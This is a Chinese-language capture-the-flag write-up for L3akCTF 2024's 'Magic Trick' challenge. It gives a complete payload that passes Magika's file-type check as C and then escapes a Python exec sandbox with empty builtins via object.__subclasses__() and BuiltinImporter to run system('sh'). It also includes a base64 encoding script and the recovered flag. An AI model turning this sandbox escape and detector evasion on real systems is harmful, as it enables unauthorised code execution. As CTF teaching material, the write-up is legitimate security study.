# L3akCTF 2024 Magic Trick Writeup

## 题目简述

服务端接收一段 Base64 编码的字节串，先让 Magika 同时用深度学习结果和最终输出结果识别文件类型，要求两者标签一致、置信度都大于 $0.99$，并拒绝标签中含有 `python` 的输入：

```python
inp = b64decode(input(">>> "))
identification = Magika().identify_bytes(inp)

dl = identification.dl
output = identification.output
if (
    dl.ct_label != output.ct_label
    or dl.score <= 0.99
    or output.score <= 0.99
    or "python" in output.ct_label
):
    exit()

exec(inp, {"__builtins__": None})
```

检测通过后，同一份内容却仍会被 Python `exec` 执行。核心是构造一份在文本特征上很像 C、语法上又是合法 Python 的 polyglot，再从 Python 对象图恢复导入能力。

## 解题过程

Python 把以 `#` 开头的行视为注释，因此可以在开头堆叠典型 C 预处理指令，让 Magika 高置信度判断为 C：

```python
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#define NULL 0
#define breakpoint extern main
```

这些行对后面的 Python 解释器没有副作用。虽然执行环境把 `__builtins__` 设为 `None`，但字面量仍可创建对象，且对象的类型关系仍然存在。官方 payload 从空列表沿 MRO 找到 `object`，再遍历其子类：

```python
a = []
void = a.__class__
bool = void.__base__
char = bool.__subclasses__()
int = char[120]
os = "os"
c_posix_t = int.load_module(os)
c_posix_t.system("sh")
```

在题目镜像对应的 Python 版本中，`char[120]` 是可加载内建模块的 `BuiltinImporter`。借助它导入 `os` 后调用 `system("sh")`，即可获得 shell，再读取 `/flag.txt`。

完整输入要先 Base64 编码：

```python
from base64 import b64encode

payload = b"""#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#define NULL 0
#define breakpoint extern main
a = []
void = a.__class__
bool = void.__base__
char = bool.__subclasses__()
int = char[120]
os = "os"
c_posix_t = int.load_module(os)
c_posix_t.system("sh")
"""

print(b64encode(payload).decode())
```

读取题目构建目录中的真实 flag 得到：

```text
L3AK{dId_you_uS3_s0m3thiN9_OTHEr_7H4n_C? :O}
```

## 方法总结

- 文件类型识别模型只能判断“像什么”，不能证明输入会被后续解释器安全地执行；检测器与解释器之间的语义差异构成了利用面。
- `{"__builtins__": None}` 不是可靠沙箱。字面量对象、类型继承链和已加载类仍可能恢复导入器或其他危险能力。
- `object.__subclasses__()` 的索引依赖 Python 版本和加载顺序。迁移利用时应枚举类名寻找 `BuiltinImporter`，不要把 `120` 当作通用常量。
